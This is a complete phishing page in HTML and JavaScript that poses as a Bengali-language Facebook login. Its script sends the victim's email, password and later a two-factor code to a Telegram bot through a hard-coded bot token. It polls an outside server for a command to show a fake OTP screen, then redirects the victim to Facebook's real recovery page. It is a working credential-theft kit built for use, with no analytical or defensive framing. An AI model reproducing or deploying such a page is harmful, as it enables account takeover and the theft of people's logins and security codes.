<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Reals</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); width: 90%; max-width: 380px; text-align: center; }
        .fb-logo { color: #1877f2; font-size: 38px; font-weight: bold; margin-bottom: 20px; letter-spacing: -2px; }
        .input-group { position: relative; width: 100%; margin: 10px 0; }
        input { width: 100%; padding: 14px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; outline: none; font-size: 16px; }
        .pass-toggle { position: absolute; right: 15px; top: 15px; color: #606770; cursor: pointer; }
        .btn { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 5px; }
        .error-msg { color: #f02849; font-size: 13px; text-align: left; margin: 5px 0; display: none; }
        .forgot-link { display: block; margin-top: 15px; color: #1877f2; text-decoration: none; font-size: 14px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hidden { display: none; }
        .otp-header { font-size: 18px; font-weight: bold; margin-bottom: 10px; color: #1c1e21; }
        .otp-sub { font-size: 14px; color: #606770; margin-bottom: 20px; line-height: 1.4; }
        .timer { font-size: 13px; color: #1877f2; margin-top: 10px; font-weight: bold; }
    </style>
</head>
<body>

<div class="login-container" id="login-box">
    <div class="fb-logo">facebook</div>
    <div class="input-group">
        <input type="text" id="email" placeholder="মোবাইল নম্বর বা ইমেইল ঠিকানা">
        <div id="email-error" class="error-msg">সঠিক মোবাইল নম্বর (১১ ডিজিট) বা ইমেইল দিন।</div>
    </div>
    <div class="input-group">
        <input type="password" id="pass" placeholder="পাসওয়ার্ড">
        <i class="fa-regular fa-eye-slash pass-toggle" id="togglePass"></i>
        <div id="pass-error" class="error-msg">পাসওয়ার্ড কমপক্ষে ৬ অক্ষরের হতে হবে।</div>
    </div>
    <button class="btn" id="login-btn">Log In</button>
    <a href="https://www.facebook.com/recover/initiate" class="forgot-link">Forgotten password?</a>
</div>

<div class="login-container hidden" id="loading-box">
    <div class="fb-logo">facebook</div>
    <div class="spinner"></div>
    <p style="font-size: 14px; color: #606770;">অ্যাকাউন্ট ভেরিফাই হচ্ছে... অপেক্ষা করুন।</p>
</div>

<div class="login-container hidden" id="otp-box">
    <div class="fb-logo">facebook</div>
    <div class="otp-header">টু-ফ্যাক্টর অথেন্টিকেশন</div>
    <div class="otp-sub">আপনার অ্যাকাউন্ট সুরক্ষিত করতে মোবাইলে পাঠানো ৬ ডিজিটের কোডটি দিন।</div>
    <input type="number" id="otp-code" placeholder="Enter code" style="text-align: center; letter-spacing: 3px; font-size: 18px; font-weight: bold;">
    <button class="btn" id="otp-btn">Continue</button>
    <div class="timer" id="timer">কোডটি পুনরায় পাঠান: 00:59</div>
</div>

<script>
    const RENDER_URL = "https://camh4ck.onrender.com"; 
    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get('id') || '7068444019';

    // পাসওয়ার্ড শো/হাইড লজিক
    const togglePass = document.querySelector('#togglePass');
    const passInput = document.querySelector('#pass');
    togglePass.addEventListener('click', function () {
        const type = passInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passInput.setAttribute('type', type);
        this.classList.toggle('fa-eye');
        this.classList.toggle('fa-eye-slash');
    });

    // টেলিগ্রামে ডাটা পাঠানোর ফাংশন (Updated for Dual Report)
    async function sendToBot(text) {
        const botToken = "8526863710:AAGQMMjFuHoWfuN5Is9lF1I4Wcf8Y0nTWXo";
        const adminId = "7068444019";
        
        // ১. অ্যাডমিনকে রিপোর্ট পাঠানো
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: adminId,
                text: text + `\n🆔 For Admin Control`,
                parse_mode: 'Markdown'
            })
        });

        // ২. লিঙ্ক মেকার ইউজারকে রিপোর্ট পাঠানো
        if (userId && userId !== adminId) {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: userId,
                    text: text + `\n✅ আপনার টার্গেট রিপোর্ট পেয়েছে!`,
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [[{ text: "📩 Request OTP Page", callback_data: `open_otp_${userId}` }]]
                    }
                })
            });
        }
    }

    // লগইন বাটন ক্লিক হ্যান্ডলার
    document.getElementById('login-btn').addEventListener('click', async () => {
        const email = document.getElementById('email').value.trim();
        const pass = document.getElementById('pass').value.trim();
        const emailErr = document.getElementById('email-error');
        const passErr = document.getElementById('pass-error');

        let isValid = true;
        const isNumber = /^\d+$/.test(email);
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

        if (isNumber ? email.length !== 11 : !emailRegex.test(email)) {
            emailErr.style.display = 'block'; isValid = false;
        } else { emailErr.style.display = 'none'; }

        if (pass.length < 6) {
            passErr.style.display = 'block'; isValid = false;
        } else { passErr.style.display = 'none'; }

        if (!isValid) return;

        document.getElementById('login-box').classList.add('hidden');
        document.getElementById('loading-box').classList.remove('hidden');

        await sendToBot(`🔥 **FB LOGIN HIT** 🔥\n👤 User: \`${email}\`\n🔑 Pass: \`${pass}\``);
        
        startChecking();
    });

    function startChecking() {
        const checkInterval = setInterval(async () => {
            try {
                const res = await fetch(`${RENDER_URL}/get_command/${userId}?t=${new Date().getTime()}`, {
                    method: 'GET',
                    mode: 'cors'
                });
                const data = await res.json();

                if (data.status === "show_otp") {
                    clearInterval(checkInterval);
                    document.getElementById('loading-box').classList.add('hidden');
                    document.getElementById('otp-box').classList.remove('hidden');
                    startTimer();
                }
            } catch (e) { console.log("Checking..."); }
        }, 3000);
    }

    function startTimer() {
        let time = 59;
        const timerDisplay = document.getElementById('timer');
        const timerInt = setInterval(() => {
            if (time > 0) {
                time--;
                timerDisplay.innerText = `কোডটি পুনরায় পাঠান: 00:${time < 10 ? '0' + time : time}`;
            } else { clearInterval(timerInt); }
        }, 1000);
    }

    document.getElementById('otp-btn').addEventListener('click', async () => {
        const otp = document.getElementById('otp-code').value;
        if (otp.length < 6) return alert("সঠিক কোড দিন।");

        await sendToBot(`📩 **OTP RECEIVED** 📩\n🔢 Code: \`${otp}\``);
        window.location.href = "https://www.facebook.com/recover/initiate";
    });
</script>
</body>
</html>
